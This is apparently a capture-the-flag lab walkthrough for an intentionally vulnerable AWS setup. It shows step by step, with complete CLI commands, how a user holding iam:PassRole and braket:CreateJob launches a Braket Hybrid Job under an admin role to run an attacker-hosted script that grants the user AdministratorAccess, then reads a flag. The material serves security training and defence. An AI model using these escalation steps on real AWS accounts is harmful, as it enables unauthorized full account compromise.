# Guided Walkthrough: Privilege Escalation via iam:PassRole + braket:CreateJob

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole` and `braket:CreateJob` permissions can create an Amazon Braket Hybrid Job with an administrative execution role and a malicious Python script that grants the starting user administrative access.

Amazon Braket is AWS's quantum computing service. Braket Hybrid Jobs are classical compute containers that run alongside quantum tasks. When creating a Hybrid Job, you specify an IAM execution role — and if you can pass a privileged role to that job while controlling the job's code, you can execute arbitrary Python with administrative permissions.

This is a "PassRole + Service" privilege escalation pattern analogous to PassRole with Lambda or Glue. The attacker creates a job with a malicious Python script hosted in an attacker-controlled S3 bucket, and the job modifies IAM permissions to grant the starting user full administrative access.

## The Challenge

You start as `pl-prod-braket-001-to-admin-starting-user` — an IAM user with `iam:PassRole` on the admin role and `braket:CreateJob`. There is also an IAM role, `pl-prod-braket-001-to-admin-admin-role`, with `AdministratorAccess` attached and a trust policy allowing `braket.amazonaws.com` to assume it.

Your goal is to weaponize these two permissions to make a Braket job run arbitrary code under that admin role, ultimately granting yourself admin access.

## Reconnaissance

First, confirm your identity and verify that you don't already have admin access.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-braket-001-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied — good, you're not admin yet
```

Get the account ID — you'll need it to construct the role ARN:

```bash
aws sts get-caller-identity --query 'Account' --output text
# {account_id}
```

## Exploitation

### Step 1: Identify the exploit script location

The Terraform deployment pre-stages a malicious Python script in an attacker-controlled S3 bucket with the `amazon-braket-` prefix (required by the default Braket service role policy). The exploit script attaches `AdministratorAccess` to the starting user using the job's execution role credentials.

The bucket name is available from Terraform output:

```bash
terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_braket_001_iam_passrole_braket_createjob.value.attacker_bucket_name'
```

### Step 2: Create the Braket Hybrid Job with the admin role

The key insight: when you create a Braket Hybrid Job and specify a `--role-arn`, Braket assumes that role for the duration of the job. Every boto3 call in your Python script runs with the permissions of that role — in this case, `AdministratorAccess`.

```bash
ADMIN_ROLE_ARN="arn:aws:iam::{account_id}:role/pl-prod-braket-001-to-admin-admin-role"
ATTACKER_BUCKET="amazon-braket-pl-prod-braket-001-{attacker_account_id}-{suffix}"

aws braket create-job \
    --region us-east-1 \
    --job-name pl-prod-braket-001-to-admin-privesc-job \
    --role-arn "$ADMIN_ROLE_ARN" \
    --algorithm-specification '{
        "scriptModeConfig": {
            "entryPoint": "exploit:main",
            "s3Uri": "s3://'"${ATTACKER_BUCKET}"'/exploit/exploit.py",
            "compressionType": "NONE"
        }
    }' \
    --output-data-config '{"s3Path": "s3://'"${ATTACKER_BUCKET}"'/exploit/output"}' \
    --instance-config '{"instanceType": "ml.m5.large", "instanceCount": 1, "volumeSizeInGb": 1}' \
    --device-config '{"device": "arn:aws:braket:::device/quantum-simulator/amazon/sv1"}' \
    --hyper-parameters '{"ATTACKER_USER": "pl-prod-braket-001-to-admin-starting-user"}' \
    --stopping-condition '{"maxRuntimeInSeconds": 300}'
# {"jobArn": "arn:aws:braket:{region}:{account_id}:job/pl-prod-braket-001-to-admin-privesc-job"}
```

This call succeeds because you have `iam:PassRole` on the target role and `braket:CreateJob`. The malicious code has not yet run — you've just submitted the job.

### Step 3: Wait for the job to complete

Braket Hybrid Jobs typically take 3-5 minutes to provision a container, run, and terminate. Poll for completion:

```bash
aws braket get-job \
    --region us-east-1 \
    --job-arn arn:aws:braket:{region}:{account_id}:job/pl-prod-braket-001-to-admin-privesc-job \
    --query 'status' \
    --output text
# QUEUED ... RUNNING ... COMPLETED
```

Once the status is `COMPLETED`, the `iam:AttachUserPolicy` call inside the script has already been made.

## Verification

Wait about 15 seconds for IAM policy changes to propagate, then verify:

```bash
aws iam list-attached-user-policies \
    --user-name pl-prod-braket-001-to-admin-starting-user \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3
# Successfully returns user list — you have admin access
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy you just gained provides implicitly.

Using the credentials you now hold (which include `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/braket-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario — only the scenario ID in the path changes.

## What Happened

The attack exploited the "PassRole + Service" pattern: two individually scoped permissions combined into a full privilege escalation. `iam:PassRole` let you delegate the admin role to Braket. `braket:CreateJob` let you define what code runs under that role.

In real environments this pattern appears when data science or quantum computing teams are given broad Braket permissions to run experiments, but the IAM roles attached to those jobs carry `AdministratorAccess` or similarly broad permissions. An attacker who compromises a researcher's credentials can follow exactly this path to full account compromise.

The Amazon Braket service is less commonly audited than Lambda or Glue, making it a particularly effective escalation vector in accounts where it is enabled. The `amazon-braket-` bucket naming constraint means the attacker-controlled bucket must follow this convention to satisfy the default service role policy — but this is trivially satisfied as demonstrated here.
